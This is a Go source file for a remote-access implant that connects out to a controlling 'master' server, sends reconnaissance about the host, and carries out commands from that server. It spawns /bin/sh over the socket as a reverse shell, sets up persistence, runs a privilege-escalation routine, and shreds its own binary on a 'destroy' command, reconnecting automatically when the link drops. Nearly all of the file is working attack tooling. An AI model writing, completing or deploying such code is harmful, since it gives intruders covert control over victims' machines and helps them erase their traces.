package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var (
	slaveToken string
)

func connectToMaster(addr string) (net.Conn, *json.Encoder, *json.Decoder, error) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, nil, nil, err
	}

	// HMAC auth if token provided
	if slaveToken != "" {
		if err := sendAuth(conn, slaveToken); err != nil {
			conn.Close()
			return nil, nil, nil, fmt.Errorf("auth failed: %v", err)
		}
	}

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)
	return conn, encoder, decoder, nil
}

func runSession(addr string) error {
	conn, encoder, decoder, err := connectToMaster(addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "connected to %s\n", addr)

	// Send recon
	if err := encoder.Encode(gatherRecon(conn)); err != nil {
		return fmt.Errorf("send recon: %v", err)
	}

	// Command loop
	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := decoder.Decode(&msg); err != nil {
			return fmt.Errorf("connection lost: %v", err)
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "shell":
			fmt.Fprintf(os.Stderr, "spawning shell...\n")
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			encoder.Encode(map[string]string{"status": "shell_ready"})

			if err := cmd.Run(); err != nil {
				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
			}

			fmt.Fprintf(conn, "\n__ZHENG_SHELL_DONE__\n")

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			os.Exit(0)

		case "hb":
			encoder.Encode(map[string]string{"status": "hb_ack"})

		case "ping":
			encoder.Encode(map[string]string{"status": "pong"})

		case "persist":
			fmt.Fprintf(os.Stderr, "persisting...\n")
			result, err := persist()
			if err != nil {
				encoder.Encode(map[string]string{"status": "persist_fail", "error": err.Error()})
			} else {
				encoder.Encode(map[string]string{"status": "persisted", "detail": result})
			}

		case "lpe":
			fmt.Fprintf(os.Stderr, "running LPE audit...\n")
			encoder.Encode(map[string]string{"status": "lpe_running"})

			result, err := runLPEAudit()
			if err != nil {
				encoder.Encode(map[string]string{"status": "lpe_fail", "error": err.Error(), "output": result})
			} else {
				encoder.Encode(map[string]string{"status": "lpe_done", "output": result})
			}

		case "destroy":
			fmt.Fprintf(os.Stderr, "self-destructing...\n")
			encoder.Encode(map[string]string{"status": "destroying"})

			// Try to remove service if it exists
			destroyService()

			exePath, err := os.Executable()
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to get executable path: %v\n", err)
				encoder.Encode(map[string]string{"status": "destroy_fail", "error": err.Error()})
				return nil
			}
			exePath, _ = filepath.EvalSymlinks(exePath)

			if _, err := exec.LookPath("shred"); err == nil {
				fmt.Fprintf(os.Stderr, "shredding %s\n", exePath)
				shred := exec.Command("shred", "-zuvn", "3", exePath)
				shred.Run()
			} else {
				fmt.Fprintf(os.Stderr, "shred not found, removing %s\n", exePath)
				os.Remove(exePath)
			}

			encoder.Encode(map[string]string{"status": "destroyed"})
			fmt.Fprintf(os.Stderr, "goodbye\n")
			os.Exit(0)

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	tokenFlag := flag.String("token", "", "HMAC token for master auth (or use ZHENG_TOKEN env)")
	flag.Parse()

	// Load token
	if *tokenFlag != "" {
		slaveToken = sanitizeToken(*tokenFlag)
	} else if os.Getenv("ZHENG_TOKEN") != "" {
		slaveToken = os.Getenv("ZHENG_TOKEN")
	}

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: slave -connect <ip:port> [-token <token>]\n")
		os.Exit(1)
	}

	// Auto-reconnect loop with exponential backoff
	backoff := 1 * time.Second
	maxBackoff := 60 * time.Second

	for {
		err := runSession(*connectAddr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "session ended: %v, reconnecting in %v...\n", err, backoff)
			time.Sleep(backoff)

			// Exponential backoff
			backoff = backoff * 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
		} else {
			// Clean exit (e.g., /exit command)
			break
		}
	}
}
